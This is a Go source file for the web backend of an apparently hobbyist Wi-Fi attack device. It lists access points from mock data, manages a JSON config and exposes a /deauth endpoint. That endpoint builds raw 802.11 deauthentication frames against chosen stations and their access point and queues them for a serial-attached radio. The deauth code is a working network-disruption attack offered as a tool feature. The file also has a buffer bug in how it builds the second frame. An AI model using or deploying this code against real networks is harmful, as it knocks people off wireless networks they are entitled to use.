package main

import (
	"html/template"
	"net/http"
	"os"
	//"os/exec"
	"fmt"
	"github.com/gobuffalo/packr"
	"github.com/gorilla/mux"
	"encoding/json"
	"github.com/tarm/serial"
	"time"
	//"strconv"
	"io/ioutil"
	//"github.com/pkg/profile"

	//"strings"
	//"log"
	//"reflect"
)

//const MacAddr [6]byte = [6]byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF} //*Replace me with self address used for the Probe and Beacon Requests
const BAUD int = 115200 //Read from a file
const PORT string = "/dev/ttyAMA0"
const MSG_START byte = 0x02 
const MSG_END byte = 0x03
const CONFIG_PATH string = "./src/static/configs/config.json"

type AccessPoint struct {
	Ecn int //`json:"ecn"`
	Etype string //`json:"etype"`
	SSID string //`json:"ssid"`
	RSSI int //`json:"rssi"`
	Mac [6]byte //`json:"mac"`
	Stations []Station //`json:"stations"`
}

type Packet struct {
	DataType string `json:"data_type"`
	Rssi     int    `json:"rssi"`
	Channel  int    `json:"channel"`
	PkyType  string `json:"pky_type"`
	Src      string `json:"src"`
	Dst      string `json:"dst"`
	Bssid    string `json:"bssid"`
	Ssid     string `json:"ssid"`
}

type Station struct {
	Name string //`json:"name"`
	Vendor string //`json:"vendor"`
	Mac [6]byte //`json:"mac"`
	AP []byte //`json:"ap"`
}

var (
	APL []AccessPoint
	router * mux.Router
	writeQueue [][]byte
	readQueue []string
	logs []string
	sConn *serial.Port
	channel int
	sniffing bool
)

func main() {
	router = mux.NewRouter()

	sniffing = false
	channel = 11

	log_message(fmt.Sprintf("Default channel set to %d...", channel))

	initRoutes()
	initMockData()

	//defer profile.Start().Stop()
	//defer profile.Start(profile.MemProfile).Stop()

	go ActionHandler();

	http.ListenAndServe(":8081", router)
}


func initSerial() {
	log_message("Opening serial connection...")

	c := &serial.Config{Name: PORT, Baud: BAUD, ReadTimeout: time.Second * 5}
	sConn, _ = serial.OpenPort(c)

	log_message("Serial connection opened...")

}

func initMockData() {
	sta1 := Station{Vendor:"Apple", Mac:[6]byte{52,0,0,0,0,1}}
	sta2 := Station{Vendor:"Apple", Mac:[6]byte{52,1,1,1,1,2}}
	sta3 := Station{Vendor:"Apple", Mac:[6]byte{52,2,2,2,2,3}}
	sta4 := Station{Vendor:"Apple", Mac:[6]byte{52,3,3,3,3,4}}
	sta5 := Station{Vendor:"Apple", Mac:[6]byte{52,4,4,4,4,5}}
	sta6 := Station{Vendor:"Apple", Mac:[6]byte{52,5,5,5,5,6}}
	sta7 := Station{Vendor:"Apple", Mac:[6]byte{52,6,6,6,6,7}}

	ap1 := AccessPoint{Etype:"WEP", SSID:"Mock AP 1",RSSI: 70, Mac: [6]byte{52,234,200,167,201,78}, Stations: []Station{sta1, sta2, sta3, sta5}}
	ap2 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long test 1", RSSI: 0, Mac: [6]byte{62,134,200,167,201,78}, Stations: []Station{sta1, sta2, sta3, sta5}}
	ap3 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long test 2", RSSI: 70, Mac: [6]byte{72,124,200,167,201,78}, Stations: []Station{sta1, sta2, sta3, sta5}}
	ap4 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long test 3", RSSI: 35, Mac: [6]byte{82,114,200,167,201,78}, Stations: []Station{sta1, sta2, sta3, sta5}}
	ap5 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long test 4", RSSI: 47, Mac: [6]byte{92,104,200,167,201,78}}
	ap6 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long test 5", RSSI: 100, Mac: [6]byte{102,94,200,167,201,78}}
	ap7 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long test 6", RSSI: 89, Mac: [6]byte{112,84,200,167,201,78}}
	ap8 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long test 7", RSSI: 11, Mac: [6]byte{122,74,200,167,201,78}, Stations: []Station{sta1, sta6, sta4, sta7}}
	ap9 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long test 8", RSSI: 20, Mac: [6]byte{132,64,200,167,201,78}}
	ap10 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long 9", RSSI: 19, Mac: [6]byte{52,234,200,167,201,78}}
	ap11 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long 0", RSSI: 28, Mac: [6]byte{52,234,200,167,201,78}}
	ap12 := AccessPoint{Etype:"WPA2-PSK", SSID:"Supe-t", RSSI: 77, Mac: [6]byte{52,234,200,167,201,78}}
	ap13 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super=", RSSI: 0, Mac: [6]byte{52,234,200,167,201,78}}
	ap14 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super=", RSSI: 2, Mac: [6]byte{52,234,200,167,201,78}}
	ap15 := AccessPoint{Etype:"WPA2-PSK", SSID:"Super long test case name for test", RSSI: 70, Mac: [6]byte{52,234,200,167,201,78}}
	APL = append(APL, ap1);
	APL = append(APL, ap2);
	APL = append(APL, ap3);
	APL = append(APL, ap4);
	APL = append(APL, ap5);
	APL = append(APL, ap6);
	APL = append(APL, ap7);
	APL = append(APL, ap8);
	APL = append(APL, ap9);
	APL = append(APL, ap10);
	APL = append(APL, ap11);
	APL = append(APL, ap12);
	APL = append(APL, ap13);
	APL = append(APL, ap14);
	APL = append(APL, ap15);

	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": -30, "channel": 11, "addr1": "11:11:11:11", "addr2": "11:11:11:11", "addr3": "11:11:11:11"}`)
}

func initRoutes() {
	resources := packr.NewBox("./src/static")
	templates := packr.NewBox("./src/views")

	log_message("Initiating routes...")

	router.PathPrefix("/static").Handler(http.StripPrefix("/static/", http.FileServer(resources)))
	router.PathPrefix("/templates").Handler(http.StripPrefix("/templates/", http.FileServer(templates)))

	router.HandleFunc("/accesspoints", getAccessPoints).Methods("GET")
	router.HandleFunc("/getPackets", getPackets).Methods("GET")
	router.HandleFunc("/getConfig", getConfig).Methods("GET")
	router.HandleFunc("/setConfig", setConfig).Methods("POST")

	router.HandleFunc("/getLogs", getLogs).Methods("GET")
	router.HandleFunc("/deauth", deauthAttack).Methods("POST")

	//PAGES
	router.HandleFunc("/", func(w http.ResponseWriter, r * http.Request) {
		tmpl := []string {"./src/views/index.html"}
		i, err := template.New("").ParseFiles(tmpl...)

		if err != nil {
			fmt.Println(err)
			return; 
		}

		log_message("Redirecting to Home...")

		i.ExecuteTemplate(w, "indexHTML", "")
	})
}

func getAccessPoints(w http.ResponseWriter, r *http.Request) {
	//TODO Uncomment me for prod
	/*var cmd = []byte("amap -c " + strconv.Itoa(channel))
	writeQueue = append(writeQueue, cmd)*/

	re, _ := json.Marshal(APL)

	log_message("Getting accesspoint data...")

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}

func getPackets(w http.ResponseWriter, r *http.Request) {
	re, _ := json.Marshal(readQueue)

	log_message("Getting packets...")

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}

func getConfig(w http.ResponseWriter, r *http.Request) {

	if _, err := os.Stat(CONFIG_PATH); os.IsNotExist(err)  {
		log_message("Config file does not exist...")
		createConfig(`{"accesspoint":{"ssid":"Lambs to the Cosmic Slaughter","passwd":"Rick and Mortison","channel":12,"hidden":false},"scanner":{"interval":1000,"deep":true,"async":false,"channel":12,"hop":false}}`)
	}


	file, err := os.Open(CONFIG_PATH)

	if err != nil {
		log_message(err.Error())
		return;
	}

	dat, err := ioutil.ReadAll(file)

	if err != nil {
		log_message(err.Error())
		return
	}

	log_message("Getting Config...")

	w.Header().Set("Content-Type", "application/json")
	w.Write(dat)
}

func setConfig(w http.ResponseWriter, r *http.Request) {
	body, _ := ioutil.ReadAll(r.Body)

	_, err := os.Stat(CONFIG_PATH)

	if err == nil {
		err := os.Remove(CONFIG_PATH)

		if err != nil {
			log_message("Error removing file...")
		}
	}
	
	createConfig(string(body))
}

//func flash(w http.ResponseWriter, r *http.Request) {
	//var cmd String = ""
//}

func createConfig(data string) {
	file, err := os.Create("./src/static/configs/config.json")

	if err != nil {
		log_message("Error creating new config file...")
		return
	}

	_, err = file.Write([]byte(data))
	
	if err != nil {
		log_message("Error writing to new config file...")
		return
	}

	log_message("New config file connected...")
}


func deauthAttack(w http.ResponseWriter, r *http.Request) {
	body, _ := ioutil.ReadAll(r.Body)
	stations := []Station{}
	json.Unmarshal(body, &stations)

	if stations == nil { return }

	log_message("Deauthing stations...")

	//Loop through each station and create the corrosponding deauth packet
	for _, sta := range stations {
		deauthStation(sta)
	}
}

/*
*	Pass a station and a deauth packet will be created to be sent to the station aswell as the 
*	accesspoint. The created packet will be pushed to the writeQueue to be sent
*/

func deauthStation(station Station) {
	cmd := "send -d "

	var pa [][]byte = [][]byte{
		{0xC0, 0x00}, // Type, Subtype
		{0x00, 0x00}, // Duration
		station.Mac[:], // Receiver
		station.AP[:], // Source
		station.AP[:], // BSSID
		{0x00, 0x00}, // Fragment and Sequence
		{0x01, 0x00}, // Reason
	}

	var ps [][]byte = [][]byte{
		{0xC0, 0x00},
		{0x00, 0x00},
		station.AP[:],
		station.Mac[:],
		station.Mac[:],
		{0x00, 0x00},
		{0x01, 0x00},
	}

	var toStation []byte
	var toAccesspoint []byte

	toStation = append(toStation, []byte(cmd)...)
	toAccesspoint = append(toAccesspoint, []byte(cmd)...)

	//Create the deauth packet that will be sent to the station aswell as the accesspoint
	toStation = append(toStation, createPacket(ps)...)
	toAccesspoint = append(toStation, createPacket(pa)...)

	//log_message(fmt.Sprintf("%#X", createPacket(ps)))
	//log_message(fmt.Sprintf("%#X", createPacket(pa)))

	//log_message(fmt.Sprintf("Deauthing %#X...", station.Mac))

	//Add the packets to the queue to be sent
	writeQueue = append(writeQueue, toStation)
	writeQueue = append(writeQueue, toAccesspoint)
}

/*
*	Pass the function a list of parts
*	it will loop through and stitch the 
*	parts together and return the result
*/
func createPacket(parts [][]byte) []byte {
	var packet []byte

	for _, part := range parts {
		packet = append(packet, part...)
	}

	return packet
}

func WriteHandler(data []byte) {
	if data == nil { return }
	
	data = append(data, 0x0A);
	//!Uncomment me
	//sConn.Write(data)
}

func ReadHandler()([]byte, error) {
	var building bool = false
	var buf []byte
	var ch []byte = make([]byte, 1)

	for ch[0] != MSG_END {

		if !building && len(writeQueue) > 0 {return nil, nil }

		_, err := sConn.Read(ch)
		if err != nil {return nil, err }

		if ch[0] == MSG_START {
			building = true;
		} else if ch[0] == MSG_END {
			break
		}else if building {
			buf = append(buf, ch[0])
		}
	}

	return buf, nil
}

func ActionHandler() {
	for true {
		if len(writeQueue) > 0 {
			data := writeQueue[0]

			if (len(writeQueue) > 1) {
				writeQueue = writeQueue[1:]
			}

			WriteHandler(data);
		} else {
			byteRead, _ := ReadHandler();
			
			if byteRead != nil {
				readQueue = append(readQueue, string(byteRead))
			}
		}
	}
}

func ft(t time.Time) string {
	hour := t.Hour()
	min := t.Minute()
	sec := t.Second()

	output := fmt.Sprintf("%02d:%02d:%02d",
		hour,
		min,
		sec)

	return output
}

func log_message(message string) {
	if (len(logs) > 1500) {
		logs = logs[1:]
	}

	fmt.Println("[" + ft(time.Now()) + "] "  + message)
	logs = append(logs, ("[" + ft(time.Now()) + "] "  + message))
}

func getLogs(w http.ResponseWriter, r *http.Request) {
	re, _ := json.Marshal(logs)

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}
	/*
	Single deauth 
		Replace target with station address
		Replace source and bssid with access point addres
	Broadcast deauth
		Replace target with accesspoint address
		Replace source and bssid with station address
	*/

	